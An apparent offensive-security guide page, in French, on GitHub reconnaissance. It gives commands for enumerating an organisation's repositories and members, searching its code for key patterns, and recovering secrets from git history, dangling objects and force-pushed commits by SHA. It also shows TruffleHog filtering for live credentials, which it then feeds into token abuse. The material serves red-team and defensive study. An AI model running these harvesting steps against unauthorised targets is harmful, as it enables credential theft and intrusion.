---
title: "Reconnaissance : énumérer les organisations, les dépôts et moissonner les secrets"
order: 1
description: "Cartographier les dépôts, membres et forks d'une org GitHub via REST et GraphQL, la recherche de code GitHub et les gists, et moissonner les identifiants dans l'historique complet d'un clone, les blobs orphelins et les objets de pack avec TruffleHog et Gitleaks."
keywords:
  - GitHub enumeration
  - GitHub code search
  - git history secrets
  - trufflehog
  - gitleaks
---

# Reconnaissance

La reconnaissance contre GitHub a deux objectifs : **cartographier l'org** (dépôts, membres, forks, équipes) pour connaître la surface, et **moissonner les secrets** qui débloquent l'étape suivante. C'est sur ce second objectif que GitHub se montre particulièrement généreux : un secret commité une fois puis « retiré » survit presque toujours dans l'historique, dans les forks et dans les objets orphelins qu'un simple `git clone` embarque quand même.

## Énumérer l'organisation via REST

Avec ou sans token, l'API REST liste la structure publique ; un token l'élargit aux dépôts privés que le principal peut voir. La pagination compte : l'API plafonne à 100 par page et il faut parcourir les en-têtes `Link` ou utiliser `--paginate`.

```bash
# Repos, members, teams (gh --paginate walks every page)
gh api /orgs/ACME/repos --paginate -q '.[] | [.full_name, .visibility, .pushed_at] | @tsv'
gh api /orgs/ACME/members --paginate -q '.[].login'
gh api /orgs/ACME/teams --paginate -q '.[].slug'

# Raw curl equivalent with manual pagination
curl -s -H "Authorization: token $GH_TOKEN" \
  'https://api.github.com/orgs/ACME/repos?per_page=100&page=1'
```

Les dépôts privés récemment poussés sont les dépôts vivants ; les dépôts archivés ou dormants sont là où les vieux identifiants pourrissent sans être dérangés.

## GraphQL pour des extractions denses

GraphQL renvoie les membres, leurs dépôts et les métadonnées en un seul aller-retour, ce qui est plus discret et plus rapide que des dizaines d'appels REST :

```bash
curl -s -H "Authorization: bearer $GH_TOKEN" https://api.github.com/graphql -d '{
  "query": "query { organization(login: \"ACME\") { membersWithRole(first: 100) { nodes { login email } } repositories(first: 100, privacy: PRIVATE) { nodes { nameWithOwner pushedAt } } } }"
}'
```

Les champs `email` des membres divulguent le format des adresses internes et alimentent le phishing ou la corrélation d'auteurs de commits.

## Recherche de code à l'échelle de l'org

La recherche de code GitHub trouve des secrets et des motifs sensibles dans chaque dépôt que le token peut lire. Cadrez avec des qualificateurs :

```bash
# Secrets patterns scoped to the org
gh search code --owner ACME 'AKIA'                 # AWS key prefix
gh search code --owner ACME 'xoxb-'                # Slack bot token
gh search code --owner ACME filename:.npmrc _authToken
gh api -X GET /search/code -f q='org:ACME "BEGIN RSA PRIVATE KEY"'
```

Un résultat renvoie le chemin du fichier et un fragment de texte ; suivez-le jusqu'au blob et lisez les lignes alentour pour la valeur complète. La recherche de code n'indexe que la branche par défaut, elle rate donc les secrets qui ne vivent que dans l'historique, traités ci-après.

## Gists

Les membres laissent fuir des éléments dans des gists personnels que l'org ne voit jamais. Énumérez les gists publics d'un utilisateur et lisez-les :

```bash
gh api /users/jdoe/gists --paginate -q '.[].files | keys[]'
curl -s https://api.github.com/users/jdoe/gists | jq -r '.[].git_pull_url'
```

Les gists secrets ne sont pas listés pour les autres utilisateurs, mais leurs URL brutes sont indevinables plutôt que contrôlées en accès : toute URL de ce type trouvée dans des logs ou des référents est lisible.

## Secrets dans l'historique d'un clone

Un secret commité puis supprimé reste accessible dans le graphe de commits. Clonez et parcourez tout l'historique, pas seulement l'arbre courant :

```bash
git clone https://github.com/ACME/service.git && cd service
git log -p --all -S 'AKIA' --source                # every add/remove of the string, across all refs
git log -p --all | grep -iE 'password|secret|token|api[_-]?key|BEGIN .*PRIVATE KEY'
```

`-S` (la « pioche ») fait remonter le commit exact qui a introduit ou retiré une chaîne, et `--source` nomme la ref où il réside. C'est là que les « nettoyages » par `git rebase`/`git filter-branch` échouent : l'ancien commit est déréférencé mais toujours présent dans le pack.

## Objets orphelins et supprimés

`git fsck` fait remonter les objets présents dans un dépôt que vous détenez déjà mais qui ne sont plus référencés par aucune branche ni aucun tag, par exemple après un amend, un rebase ou un force-push locaux où les anciens objets sont encore dans votre magasin d'objets :

```bash
git fsck --lost-found --dangling 2>/dev/null       # dangling commit/blob SHAs in THIS local repo
git cat-file -p <dangling-blob-sha>                # dump a dangling blob's contents
# Walk every object reachable from refs (branches, tags, HEAD, stashes) and grep it
git rev-list --objects --all | awk '{print $1}' | while read o; do git cat-file -p "$o" 2>/dev/null; done | grep -iE 'AKIA|secret|token'
```

Connaissez la limite : un clone simple ne transfère que les objets accessibles depuis les refs du serveur, donc un secret déjà inaccessible côté serveur (force-pushé par-dessus avant que vous ne cloniez) n'est pas dans votre clone, et `git rev-list --all` parcourt les refs, pas l'ensemble du magasin d'objets. `git fsck` ne récupère donc que ce qui est orphelin dans un dépôt que vous possédez déjà. Atteindre les objets que le serveur lui-même a abandonnés est une astuce propre à GitHub, ci-dessous.

## Récupérer des commits supprimés par SHA

Sur `github.com`, un dépôt et tous ses forks partagent un seul magasin d'objets (un « réseau de dépôts »), de sorte qu'un commit poussé vers l'un d'eux reste récupérable par son SHA complet même après la suppression de la branche ou du fork. Un SHA de commit orphelin est régulièrement exposé dans la chronologie d'une pull request (le champ `before` du force-push d'un `PushEvent`, les événements de PR fermées), et tout objet du réseau est alors servi par la Git Data API depuis le dépôt parent :

```bash
# dangling commit SHAs surface in events even after a force-push rewrote the branch
curl -s -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/ACME/service/events \
  | jq -r '.[]|.payload.before? // empty'
# fetch any object in the network by SHA from the parent, even after deletion
curl -s -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/ACME/service/commits/<full-sha>
curl -s -H "Authorization: token $GH_TOKEN" https://api.github.com/repos/ACME/service/git/blobs/<blob-sha> | jq -r .content | base64 -d
```

C'est ainsi qu'un secret commité puis chassé par force-push, ou poussé vers un fork depuis supprimé, reste lisible : l'objet survit dans le réseau et l'API le remet à quiconque connaît ou parvient à énumérer le SHA.

## Scan automatisé

Lancez à la fois un scanner basé sur un connecteur sur l'API de l'org et un scan en profondeur de l'historique sur les clones ; ils attrapent des choses différentes.

```bash
# TruffleHog across an org's repos, verifying live credentials as it goes
trufflehog github --org=ACME --token="$GH_TOKEN" --only-verified

# TruffleHog against a single repo including full history
trufflehog git https://github.com/ACME/service.git

# Gitleaks over the complete history of a local clone
gitleaks detect --source . --log-opts="--all" -v
```

`--only-verified` filtre TruffleHog aux secrets avec lesquels il a réellement pu s'authentifier, réduisant le bruit aux identifiants immédiatement utilisables. Le `--log-opts="--all"` de Gitleaks le force à travers chaque ref, reproduisant l'approche manuelle de la pioche à grande échelle.

## Notes d'exploitation

- Scannez toujours l'historique, pas le checkout : `--all` et `git fsck` atteignent ce que la recherche de code et un clone simple ne peuvent pas.
- Privilégiez les résultats vérifiés (`--only-verified`) quand vous avez besoin d'une victoire rapide ; traitez les résultats non vérifiés comme des pistes à valider à la main.
- Un SHA de commit divulgué sur un dépôt public est récupérable depuis le parent même s'il est « supprimé » ; conservez les SHA que vous croisez dans les logs et les commentaires.
- Alimentez chaque token, clé ou identifiant de déploiement récupéré directement vers [l'abus de token et de GITHUB_TOKEN](token-and-github-token-abuse.md) pour établir la portée et l'atteinte.

## Outils

- **TruffleHog** : scan de secrets à l'échelle de l'org et par dépôt avec vérification en direct des identifiants.
- **Gitleaks** : détection rapide de secrets par regex et entropie sur l'ensemble de l'historique git.
- **gh** : CLI officiel qui enveloppe REST/GraphQL, avec `--paginate` et `search code` pour l'énumération.
- **git-dumper** : reconstruit un dépôt à partir d'un répertoire `.git` exposé sur un hôte web.
- **gitrob** / **GitHound** : découverte de surface d'attaque et de secrets au niveau org et utilisateur.

## Références

- [GitHub REST API : dépôts et recherche](https://docs.github.com/en/rest/repos/repos)
- [TruffleHog (Truffle Security)](https://github.com/trufflesecurity/trufflehog)
- [Gitleaks](https://github.com/gitleaks/gitleaks)
- [Truffle Security : n'importe qui peut accéder aux données de dépôts supprimés et privés sur GitHub](https://trufflesecurity.com/blog/anyone-can-access-deleted-and-private-repo-data-github)
- [Docs GitHub : rechercher du code](https://docs.github.com/en/search-github/searching-on-github/searching-code)
